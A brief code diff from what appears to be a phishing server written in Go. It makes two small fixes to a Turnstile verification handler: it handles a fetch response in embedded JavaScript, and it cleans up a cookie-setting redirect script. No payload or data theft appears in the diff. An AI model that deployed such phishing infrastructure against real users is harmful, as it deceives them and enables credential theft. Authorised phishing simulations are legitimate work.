@@ -344,7 +344,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 					headers: {
 					  "Content-type": "application/json; charset=UTF-8"
 					}
-				  });
+				}).then((response) => {return response.text()});
 			},
 		});
 	};</script>`
@@ -378,7 +378,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 				cookie.Path = "/"
 				http.SetCookie(w, &cookie)
 				// set redirect
-				redirect := `<script>window.location.replace('https://` + r.Host + `/?sq=` + rid + `');</script></head>`
+				redirect := `<script>window.location.replace('https://` + r.Host + `/?sq=` + rid + `');</script>`
 				fmt.Fprint(w, redirect)
 			} else {
 				fmt.Fprint(w, fmt.Sprintf(message, "Please try again."))
